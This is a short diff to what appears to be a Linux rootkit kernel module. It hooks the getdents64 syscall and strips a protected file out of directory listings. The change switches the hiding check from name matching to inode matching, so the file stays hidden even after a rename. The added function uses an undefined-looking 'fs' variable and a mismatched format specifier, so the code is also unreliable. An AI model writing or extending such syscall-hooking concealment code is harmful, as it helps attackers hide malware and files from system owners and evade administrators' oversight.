@@ -65,6 +65,14 @@ int isFileProtected(unsigned int fd, FILE_PROTECT_TYPE type) {
     return 0;
 }
 
+int isInodeProtected(unsigned long inode, FILE_PROTECT_TYPE type) {
+    //conivent_printf("isInodeProtected %d, %d", inode, fs->f_dentry->d_inode->i_ino);
+    if (fs->f_dentry->d_inode->i_ino == inode) {
+        return 1;
+    }
+    return 0;
+}
+
 // test code end
 
 asmlinkage int (*origin_mkdir)(const char *path, mode_t mode);
@@ -144,7 +152,8 @@ asmlinkage long modified_getdents64 (unsigned int fd, struct linux_dirent64 *dir
             break;
         }
         
-        if (strncmp(dirp3->d_name, hide_file, strlen(hide_file)) == 0) {
+        //if (strncmp(dirp3->d_name, hide_file, strlen(hide_file)) == 0) {
+        if (isInodeProtected(dirp3->d_ino, FILE_PROTECT_READ)) {
             if (!prev) {
                 // head is our file
                 head = (struct linux_dirent64*)((char *)dirp3 + record_length);
